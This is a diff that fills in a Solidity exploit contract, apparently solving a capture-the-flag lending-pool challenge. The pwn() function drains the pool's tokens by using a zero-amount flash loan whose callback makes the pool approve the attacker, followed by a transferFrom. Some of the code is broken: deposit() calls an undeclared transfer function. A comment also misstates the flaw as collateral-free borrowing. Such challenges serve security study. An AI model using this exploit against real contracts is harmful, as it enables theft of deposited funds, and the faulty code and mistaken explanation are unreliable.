@@ -76,6 +76,11 @@ interface ILendingPool {
 interface ILendingPoolToken {
     // ILendingPoolToken is ERC20
     // declare any ERC20 functions that you need to call here
+    function balanceOf(address) external view returns (uint);
+
+    function approve(address, uint) external returns (bool);
+
+    function transferFrom(address, address, uint) external returns (bool);
 }
 
 contract LendingPoolExploit {
@@ -87,7 +92,24 @@ contract LendingPoolExploit {
         token = ILendingPoolToken(pool.token());
     }
 
+    receive() external payable {}
+
+    function deposit() external payable {
+        token.transfer(address(this), msg.value);
+    }    
+
     function pwn() external {
-        // this function will be called
+        // retrieve the balance of the lending pool token held by the lending pool contract
+        uint bal = token.balanceOf(address(pool)); 
+
+        // exploit leverages the ability to perform flash loans with an amount of 0,
+        // effectively allowing the attacker to borrow tokens without collateral
+        ILendingPool(pool).flashLoan(
+            0, 
+            address(token), // specifies the lending pool token as the target
+            abi.encodeWithSelector(token.approve.selector, address(this), bal)
+        );
+        // here we receives an approval to transfer tokens from the lending pool
+        token.transferFrom(address(pool), address(this), bal);
     }
 }
